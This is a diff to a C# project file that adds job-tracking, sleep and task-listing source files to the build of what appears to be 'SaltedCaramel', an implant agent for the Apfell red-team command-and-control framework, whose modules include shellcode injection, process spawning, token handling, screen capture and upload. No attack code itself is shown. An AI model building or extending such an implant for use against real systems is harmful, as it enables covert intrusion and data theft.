@@ -95,6 +95,7 @@
   <ItemGroup>
     <Compile Include="Apfell.cs" />
     <Compile Include="DefaultProfile.cs" />
+    <Compile Include="Jobs.cs" />
     <Compile Include="SaltedCaramel.cs" />
     <Compile Include="SCTask.cs" />
     <Compile Include="SCImplant.cs" />
@@ -111,7 +112,9 @@
     <Compile Include="Tasks\ProcessList.cs" />
     <Compile Include="Tasks\ScreenCapture.cs" />
     <Compile Include="Tasks\Shellcode.cs" />
+    <Compile Include="Tasks\Sleep.cs" />
     <Compile Include="Tasks\Spawn.cs" />
+    <Compile Include="Tasks\Tasks.cs" />
     <Compile Include="Tasks\Token.cs" />
     <Compile Include="Tasks\Upload.cs" />
     <Compile Include="Win32\Advapi32.cs" />
